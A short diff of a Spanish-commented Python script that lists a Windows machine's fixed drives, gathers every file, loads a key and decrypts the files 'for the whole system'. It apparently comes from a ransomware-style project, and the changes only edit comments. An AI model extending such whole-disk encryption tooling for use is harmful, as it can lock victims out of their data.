@@ -6,7 +6,7 @@ import wmi
 
 
 c = wmi.WMI()
-# Obtener los discos duros
+#pillar discos duros
 disks = [drive.DeviceID for drive in c.Win32_LogicalDisk() if drive.DriveType == 3]
 
 
@@ -68,7 +68,7 @@ def obtener_archivos_en_directorio(path):
 
 if __name__ == "__main__":
     c = wmi.WMI()
-    # Obtener los discos duros
+    #pillar discos duros
     disks = [drive.DeviceID for drive in c.Win32_LogicalDisk() if drive.DriveType == 3]
 
     ### ESTO ES PARA DESENCRIPTAR TOTALMENTE EL SISTEMA ### SOLO DESCOMENTAR PARA PRUEBAS FINALES
@@ -84,8 +84,8 @@ if __name__ == "__main__":
         #Pillar todos los archivos
         items = obtener_archivos_en_directorio(path_to_decrypt)
 
-        # Cargar la llave
+        #llave
         key = cargar_llave()
 
-        # Desencriptar los archivos
+        #desencriptar
         desencriptar(items, key)
